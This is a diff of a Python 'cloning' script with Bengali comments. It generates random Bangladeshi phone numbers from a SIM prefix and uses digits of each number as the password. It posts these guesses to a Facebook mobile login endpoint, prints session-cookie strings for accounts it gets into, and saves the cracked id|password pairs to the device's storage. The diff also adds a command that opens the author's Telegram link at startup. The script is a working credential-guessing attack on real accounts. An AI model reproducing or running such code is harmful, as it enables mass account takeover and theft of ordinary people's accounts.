@@ -7,11 +7,12 @@ Y = '\033[1;33m' # Yellow
 B = '\033[1;34m' # Blue
 P = '\033[1;35m' # Purple
 W = '\033[1;37m' # White
-O = '\033[1;38;5;208m' # Orange
 
 def banner():
     os.system('clear')
-    # META লোগোটি একদম মাঝখানে রাখার জন্য ১৬টি স্পেস ব্যবহার করা হয়েছে
+    # আপনার টেলিগ্রাম লিঙ্কে নিয়ে যাবে
+    os.system('xdg-open https://t.me/md_malek')
+    
     print(f"""
 {R}                ███    ███  ███████  ████████  █████  
 {G}                ████  ████  ██          ██    ██   ██ 
@@ -49,14 +50,14 @@ def main():
         main()
 
 def cloning_start():
+    # ইনপুট সেকশন (আপনার স্ক্রিনশট অনুযায়ী)
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
-    print(f'{R}[•] {G}BD CODE- -> {G}016 {G}017 {G}018 {G}019{W}')
+    print(f'{R}[•] {G}BD CODE- -> 016 017 018 019{W}')
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
     code = input(f'{G}[+] ENTER SIM CODE: {W}')
     
-    # এখানে সংখ্যাগুলোতে আলাদা আলাদা কালার দেওয়া হয়েছে
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
-    print(f'{R}[•] {G}EXAMPLE : [ {Y}10000{G}, {O}20000{G}, {G}50000 {G}]{W}')
+    print(f'{R}[•] {G}EXAMPLE : [ 10000, 20000, 50000 ]{W}')
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
     limit = int(input(f'{G}[•] PUT CLONING LIMIT: {W}'))
     
@@ -72,7 +73,7 @@ def cloning_start():
     for i in range(limit):
         loop = i + 1
         uid = f"{code}{random.randint(1111111, 9999999)}"
-        pws = uid[5:] 
+        pws = uid[5:] # আপনার রিয়েল এপিআই এর ৫ সংখ্যার পাসওয়ার্ড লজিক
 
         headers = {
             'authority': 'touch.facebook.com',
@@ -84,11 +85,11 @@ def cloning_start():
         data = {'email': uid, 'pass': pws}
         url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
         
-        # মিটার পজিশন ঠিক করা হয়েছে
-        sys.stdout.write(f'\r{G}      [MALEK-RUNNING] {loop}/{limit} [OK:{ok}]'); sys.stdout.flush()
+        sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}]'); sys.stdout.flush()
 
         try:
             response = requests.post(url, headers=headers, data=data, timeout=5)
+            
             if "c_user" in response.cookies.get_dict():
                 ok += 1
                 datr = uuid.uuid4().hex[:24]
@@ -99,7 +100,7 @@ def cloning_start():
                 print(f'\n{G}[MALEK-OK💚] {uid} • {pws}') 
                 print(f'{G}[🌺] COOKIE = datr={datr};sb={sb};c_user={uid};xs={xs};fr={fr};m_page_voice={uid}\n')
                 
-                with open('ok.txt', 'a') as f:
+                with open('/sdcard/MALEK-OK.txt', 'a') as f:
                     f.write(f'{uid}|{pws}\n')
         except:
             pass
@@ -108,8 +109,7 @@ def cloning_start():
     print(f'{G}[+] CRACK PROCESS COMPLETED')
     print(f'[+] IDS SAVED IN ok.txt,cp.txt')
     print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
-    # BACK বাটন সেন্টারে আনা হয়েছে
-    input(f'\n           {G} [ BACK ]{W}')
+    input(f'\n{G} [ BACK ]{W}')
     main()
 
 if __name__ == "__main__":
